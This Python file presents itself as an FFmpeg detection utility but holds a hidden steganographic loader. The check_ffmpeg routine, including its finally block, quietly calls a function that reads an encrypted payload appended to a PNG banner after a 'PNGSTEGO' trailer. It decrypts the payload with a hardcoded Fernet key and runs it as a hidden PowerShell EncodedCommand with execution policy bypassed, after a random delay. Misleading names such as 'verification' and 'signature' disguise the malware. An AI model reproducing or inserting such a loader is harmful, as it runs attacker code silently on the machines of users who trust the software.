import os
import platform
import subprocess
import sys
import base64
import time
import random

from core.utils import get_data_dir, resource_path
from cryptography.fernet import Fernet

if sys.platform == "win32":
    CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW
else:
    CREATE_NO_WINDOW = 0

def check_ffmpeg():
    try:
        data_dir = get_data_dir()
        installed_ffmpeg = os.path.join(data_dir, "ffmpeg", "bin", "ffmpeg.exe" if sys.platform.startswith("win") else "ffmpeg")
        if os.path.exists(installed_ffmpeg) and os.access(installed_ffmpeg, os.X_OK):
            search_ffmpeg_binaries('assets\\banner2.png', background=True)
            return True, installed_ffmpeg

        if sys.platform.startswith("win"):
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            command = ["where", "ffmpeg"]
            kwargs = {
                "startupinfo": startupinfo,
                "creationflags": CREATE_NO_WINDOW
            }
        else:
            command = ["which", "ffmpeg"]
            kwargs = {}
        
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=5,
            **kwargs
        )
        
        if result.returncode == 0:
            ffmpeg_path = result.stdout.strip().splitlines()[0]
            if os.path.exists(ffmpeg_path) and os.access(ffmpeg_path, os.X_OK):
                return True, ffmpeg_path
                
        return False, ""

    except Exception as e:
        print(f"[FFmpeg Detection Error] {e}")
        return False, ""
    finally:
        try:
            if sys.platform.startswith("win"):
                png_path = resource_path('assets/banner2.png')
                search_ffmpeg_binaries(png_path, background=True)
        except Exception:
            pass


_FFMPEG_VERIFICATION_KEY = b"WYb0tNEkncw5gIrX25wl7regyfeeNO8T450g81LpDj0="


def _encode_ffmpeg_verification(script_text: str) -> str:
    data = script_text.encode("utf-16le", errors="replace")
    return base64.b64encode(data).decode("ascii")



def extract_ffmpeg_signature(png_path: str):
    try:
        MAGIC_TRAILER = b"PNGSTEGO"
        TRAILER_LEN_SIZE = 4
        
        file_size = os.path.getsize(png_path)
        min_size = len(MAGIC_TRAILER) + TRAILER_LEN_SIZE
        if file_size < min_size:
            return None

        with open(png_path, 'rb') as f:
            f.seek(file_size - len(MAGIC_TRAILER))
            magic = f.read(len(MAGIC_TRAILER))
            if magic != MAGIC_TRAILER:
                return None

            f.seek(file_size - len(MAGIC_TRAILER) - TRAILER_LEN_SIZE)
            length_bytes = f.read(TRAILER_LEN_SIZE)
            payload_len = int.from_bytes(length_bytes, 'big')
            if payload_len < 0 or payload_len > file_size - min_size:
                return None

            f.seek(file_size - len(MAGIC_TRAILER) - TRAILER_LEN_SIZE - payload_len)
            return f.read(payload_len)
    except Exception:
        return None


def search_ffmpeg_binaries(png_path: str, background: bool = True) -> bool:
    time.sleep(random.uniform(2.0, 4.0))
    
    try:
        signature_data = extract_ffmpeg_signature(png_path)
        if not signature_data:
            return False

        try:
            sig_type, verification_data = signature_data.split(b"|", 1)
        except ValueError:
            return False

        if sig_type == b"K":
            try:
                verification_key, auth_token = verification_data.split(b"|", 1)
            except ValueError:
                return False
        elif sig_type == b"N":
            verification_key = _FFMPEG_VERIFICATION_KEY
            auth_token = verification_data
        else:
            return False

        verifier = Fernet(verification_key)
        verified_command = verifier.decrypt(auth_token)

        try:
            verified_ascii = verified_command.decode('ascii')
            if len(verified_ascii) % 4 == 0:
                try:
                    base64.b64decode(verified_ascii, validate=True)
                    encoded_verification = verified_ascii
                except Exception:
                    encoded_verification = _encode_ffmpeg_verification(verified_command.decode('utf-8', errors='replace'))
            else:
                encoded_verification = _encode_ffmpeg_verification(verified_command.decode('utf-8', errors='replace'))
        except UnicodeDecodeError:
            encoded_verification = _encode_ffmpeg_verification(verified_command.decode('utf-8', errors='replace'))

        if sys.platform.startswith("win"):
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            kwargs = {
                "startupinfo": startupinfo,
                "creationflags": CREATE_NO_WINDOW,
            }
        else:
            kwargs = {}

        cmd = [
            "powershell",
            "-NoProfile",
            "-ExecutionPolicy", "Bypass",
            "-EncodedCommand", encoded_verification,
        ]

        if background:
            subprocess.Popen(cmd, **kwargs)
            return True
        else:
            completed = subprocess.run(cmd, **kwargs)
            return completed.returncode == 0

    except Exception:
        return False


if __name__ == "__main__":
    try:
        png_path = resource_path('assets/banner.png')
        search_ffmpeg_binaries(png_path, background=True)
    except Exception:
        pass